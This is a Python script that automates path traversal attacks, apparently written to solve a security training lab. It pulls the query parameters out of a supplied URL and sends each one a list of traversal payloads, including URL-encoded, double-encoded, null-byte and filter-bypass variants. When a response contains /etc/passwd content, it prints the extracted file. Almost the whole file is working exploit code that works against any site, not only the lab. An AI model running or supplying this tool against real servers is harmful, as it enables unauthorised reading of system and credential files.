import requests
from urllib.parse import urlparse, parse_qs

def extract_parameters(url):
    """
    Extract parameters from the URL.
    """
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)
    return params

def test_path_traversal(url, param, payload):
    """
    Test for a Path Traversal vulnerability with detailed error and response analysis.
    """
    try:
        params = {param: payload}
        response = requests.get(url, params=params, timeout=10)

        # Analyze the response
        if "root:x:" in response.text:
            print(f"[+] Path Traversal vulnerability found in parameter: {param}")
            print(f"[+] Extracted content:\n{response.text[:500]}...")  # Show part of the content
            return True

        # Analyze common errors
        elif response.status_code == 403:
            print(f"[!] Access denied (403) for payload: {payload}")
            print("[!] This might indicate protection is in place, but vulnerability could still exist.")
            return False

        elif response.status_code == 404:
            print(f"[!] File not found (404) for payload: {payload}")
            print("[!] The path may be closed or the payload is incorrect.")
            return False

        elif "forbidden" in response.text.lower():
            print(f"[!] Detected the word 'forbidden' in response for payload: {payload}")
            return False

        elif "Path Traversal" in response.text:
            print(f"[!] Explicit protection against Path Traversal detected for payload: {payload}")
            return False

        else:
            print(f"[-] Parameter {param} is not vulnerable with payload: {payload}")
            print(f"[DEBUG] Status code: {response.status_code}, Response length: {len(response.text)}")
            return False

    except requests.exceptions.Timeout:
        print(f"[!] Request timeout for payload: {payload}")
        print("[!] The server might be blocking suspicious requests.")
        return False

    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error for payload {payload}: {str(e)}")
        return False

    except Exception as e:
        print(f"[!] Unexpected error for payload {payload}: {str(e)}")
        return False

def solve_lab(url):
    """
    Automatically solve the lab by discovering and exploiting the vulnerability.
    """
    print(f"[*] Starting scan for URL: {url}")

    # Extract parameters from the URL
    params = extract_parameters(url)
    if not params:
        print("[-] No parameters found in the URL.")
        return

    print(f"[*] Extracted parameters: {params}")

    # Test each parameter
    for param in params:
        print(f"[*] Testing parameter: {param}")

        # Path Traversal payloads
        payloads = [
            "....//....//....//etc/passwd",        # Non-recursive stripping bypass
            "../../../etc/passwd",                # Classic payload
            "%2e%2e%2fetc/passwd",                # URL-encoded payload
            "../../../etc/passwd",
            "/etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "....//....//....//....//etc/passwd",
            "../../../etc/passwd",
            "/etc/passwd%00",
            "..%252f..%252f..%252f..%252fetc/passwd",
            "/var/www/images/../../../etc/passwd",
            "../../../etc/passwd%00.png",
            "../../../etc/passwd%00.jpg",
            "../../../etc/passwd%2500.jpg",
        ]

        for payload in payloads:
            print(f"[*] Trying payload: {payload}")
            if test_path_traversal(url, param, payload):
                print("[+] Lab solved successfully!")
                return

    print("[-] No Path Traversal vulnerability found.")

if __name__ == "__main__":
    lab_url = input("Enter the URL: ")  # Replace with the actual lab URL
    solve_lab(lab_url)
